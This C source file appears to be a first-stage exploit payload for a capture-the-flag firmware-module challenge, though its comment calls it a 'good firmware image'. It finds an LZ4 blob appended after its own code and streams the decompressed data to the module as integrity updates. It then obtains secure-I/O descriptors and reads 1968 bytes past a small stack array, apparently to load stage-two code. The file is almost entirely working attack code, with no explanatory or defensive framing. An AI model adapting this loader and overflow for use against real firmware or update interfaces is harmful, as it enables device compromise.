// good firmware image, that authenticates itself successfully
#include <stddef.h>
#include <stdint.h>
#include <sys/socket.h>

int _read_syscall(int fd, char *buf, unsigned long long n);
int _write_syscall(int fd, char *buf, unsigned long long n);
unsigned long _get_pc();

typedef struct __attribute__((__packed__)) {
	unsigned short tag;
	unsigned short size;
	unsigned short cmd;
	unsigned short _pad;
} sfm_command_t;

typedef struct __attribute__((__packed__)) {
	sfm_command_t header;
	unsigned short bank_index;
	unsigned short _pad;
	char payload[1024];
} sfm_integrity_update_t;

typedef struct __attribute__((__packed__)) {
	sfm_command_t header;
	unsigned short bank_index;
	unsigned short _pad;
} sfm_integrity_read_t;

typedef struct __attribute__((__packed__)) {
	sfm_command_t header;
	unsigned int object_index;
	unsigned char county_code[2];
	unsigned char _padding[2];
	unsigned char owner_name[64];
	unsigned char device_name[16];
	unsigned char serial[8];
	unsigned timestamp;
} sfm_modify_object_t;

typedef struct __attribute__((__packed__)) {
	sfm_command_t header;
	unsigned short alg_id;
} sfm_attest_quote_t;

typedef struct __attribute__((__packed__)) {
	sfm_command_t header;
	unsigned object_index;
} sfm_certify_object_t;

typedef struct __attribute__((__packed__)) {
	sfm_command_t header;
	unsigned short flags;
} sfm_establish_secure_io_t;

// NOTE: this must be the very first declared function for things
// to work end-to-end
int _start(void) {
	int magic;
	_read_syscall(3, &magic, 4);
	_write_syscall(3, (char *)&magic, 4);

    decompress_and_authenticate();

    read_in_stage2(3);
}

unsigned long
lz4_depack(const void *src, void *dst, unsigned long packed_size)
{
	const unsigned char *in = (unsigned char *) src;
	unsigned char *out = (unsigned char *) dst;
	unsigned long dst_size = 0;
	unsigned long cur = 0;
	unsigned long prev_match_start = 0;

	/* Main decompression loop */
	while (cur < packed_size) {
		unsigned long token = in[cur++];
		unsigned long lit_len = token >> 4;
		unsigned long len = (token & 0x0F) + 4;
		unsigned long offs;
		unsigned long i;

		/* Read extra literal length bytes */
		if (lit_len == 15) {
			while (in[cur] == 255) {
				lit_len += 255;
				++cur;
			}
			lit_len += in[cur++];
		}

		/* Copy literals */
		for (i = 0; i < lit_len; ++i) {
			out[dst_size++] = in[cur++];
		}

		/* Check for last incomplete sequence */
		if (cur == packed_size) {
			/* Check parsing restrictions */
			if (dst_size >= 5 && lit_len < 5) {
				return 0;
			}

			if (dst_size > 12 && dst_size - prev_match_start < 12) {
				return 0;
			}

			break;
		}

		/* Read offset */
		offs = (unsigned long) in[cur] | ((unsigned long) in[cur + 1] << 8);
		cur += 2;

		/* Read extra length bytes */
		if (len == 19) {
			while (in[cur] == 255) {
				len += 255;
				++cur;
			}
			len += in[cur++];
		}

		prev_match_start = dst_size;

		/* Copy match */
		for (i = 0; i < len; ++i) {
			out[dst_size] = out[dst_size - offs];
			++dst_size;
		}
	}

	/* Return decompressed size */
	return dst_size;
}

void decompress_and_authenticate() {
    //unsigned int *input = (unsigned int *)(pc + 0x1000);
    unsigned char *c_input = (unsigned char *)&_get_pc;
    while (*c_input++ != 0xc3);
    unsigned int *input = (unsigned int *)(c_input);

    unsigned int magic = input[0];      

    unsigned int packed_sz = input[1];
    //unsigned char *compressed_ptr = &input[2];

    if (magic != 0x184c2102) {
        return;
    }

    char out_buf[0x2000];
    unsigned int sz = lz4_depack(&input[2], out_buf, packed_sz);
    if (sz == 0) {
        return;
    }
    
    /*
    if (sz != 0x2000) {
        return;
    }
    */
    
    unsigned i = 0;
    for (i = 0; i < sz; i += 1024) {
        send_integrity_update(3, 1, out_buf + i, 1024);
    }

    return;
}

void read_in_stage2(int fd) {
	int fds[2] = {0};
	send_establish_secure_io(fd, 3, &fds);
	//int std_in = fds[0];
	//int std_out = fds[1];    

    int prompt = 0x203c;
    _write_syscall(fds[1], &fds, 0x100);
    int i = 0;
    for (i=0;i<1968;i++) {
        _read_syscall(fds[0], (((unsigned char *)&fds)+0x10)+i, 1);
    }
    //read_fixed(fds[0], (((unsigned char *)&fds)+0x10), 1968);
}

/*
void read_fixed(int fd, unsigned char *dst, size_t n) {
    int i = 0;
    for (i=0;i<n;i++) {
        _read_syscall(fd, dst+i, 1);
    }
}
*/

/*
void _memcpy(unsigned char *dst, unsigned char *src, size_t n) {
	while (n-- > 0) { *dst++ = *src++; }
}*/

void _memcpy(unsigned char *dest, unsigned char *src, size_t n) {
    asm volatile (
        "rep movsb"
        : "=D" (dest), "=S" (src), "=c" (n)
        : "0" (dest), "1" (src), "2" (n)
        : "memory"
    );
}

/*
void _memset(unsigned char *dest, unsigned char x, size_t n) {
    asm volatile (
        "rep stosb"
        : "=D" (dest), "=a" (x), "=c" (n)
        : "0" (dest), "1" (x), "2" (n)
        : "memory"
    );
}*/


void _memset(unsigned char *dst, unsigned char x, size_t n) {
	while (n-- > 0) { *dst++ = x; }
}

int send_integrity_update(int fd,
              int bank_idx,
              unsigned char *content_start,
              size_t len) {

    sfm_integrity_update_t msg;

    msg.header.tag = 0x1;
    msg.header.size = 0x4;
    msg.header.cmd = 1;

    msg.bank_index = bank_idx;

    _memset(msg.payload, '\x00', 1024);
    _memcpy(msg.payload, content_start, len);

    _write_syscall(fd, &msg, sizeof(msg));

    int ret = 0;
    _read_syscall(fd, &ret, sizeof(ret));
    return ret;
}

int send_establish_secure_io(int fd, int flags, int *fds) {
	sfm_establish_secure_io_t msg;

	msg.header.tag = 0x2;
	msg.header.size = 0x6;
	msg.header.cmd = 8;

	msg.flags = flags;

	_write_syscall(fd, &msg, sizeof(msg));

	struct msghdr mh = {0};

	unsigned char buf[CMSG_SPACE(sizeof(int) * 2)];

	struct cmsghdr *cmsghdr = (struct cmsghdr *)buf;
    	cmsghdr->cmsg_len = CMSG_LEN(sizeof(int)*2);
    	cmsghdr->cmsg_level = SOL_SOCKET;
    	cmsghdr->cmsg_type = SCM_RIGHTS;

	int fd_count = 0;
	struct iovec iov[1];
	iov[0].iov_base = &fd_count;
	iov[0].iov_len = sizeof(fd_count);

	mh.msg_iov = &iov;
	mh.msg_iovlen = 1;
	mh.msg_control = cmsghdr;
	mh.msg_controllen = CMSG_LEN(sizeof(int)*2);

	int rc = _recvmsg_syscall(fd, &mh, 0);
	if (rc < 0) {
		return -1;
	}

	_memcpy(fds, CMSG_DATA(cmsghdr), sizeof(int) * 2);

	return 0;
}
